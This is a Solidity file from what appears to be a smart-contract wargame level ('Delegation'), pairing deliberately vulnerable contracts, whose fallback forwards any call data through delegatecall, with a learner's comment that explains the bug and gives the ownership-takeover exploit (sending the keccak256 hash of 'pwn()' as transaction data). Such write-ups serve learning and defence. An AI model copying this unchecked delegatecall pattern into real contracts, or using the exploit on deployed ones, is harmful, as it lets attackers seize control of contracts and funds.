// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  } 
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
/**
The objective is to claim the ownership of our instance
Delegate call

Delegatecall is simply a contract that says i  allow you to do whatever you want to my storage

Call changes the address and value of the original message but delegate call doesnt

variables have to be in the same order in both contracts

solution : var pwn_attack = web3.utils.keccak256("pwn()")
we create a variable that is a hash for the faunction that we need to get the owner ship

contract.sendTransaction({data: pwn_attack})

so this transaction makes a transaction has the function hash data
and since we are the msg.sender it runs the function and makes us the owner
 */